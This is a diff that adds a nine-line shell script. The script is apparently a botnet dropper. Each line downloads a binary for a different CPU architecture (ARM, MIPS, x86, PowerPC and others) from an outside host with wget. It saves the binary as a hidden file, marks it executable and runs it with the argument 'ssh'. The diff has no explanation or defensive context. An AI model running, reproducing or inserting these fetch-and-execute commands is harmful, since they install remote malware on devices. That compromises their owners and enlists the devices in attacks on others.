@@ -1,0 +1,9 @@
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/arm -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/arm5 -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/arm6 -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/arm7 -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/mips -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/mipsel -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/x86 -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/x86_64 -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
+cd here; chmod 777 .h || chmod +x .h; wget http://dns.cyberium.cc/powerpc -O -> .h; chmod 777 .h || chmod +x .h; ./.h ssh;
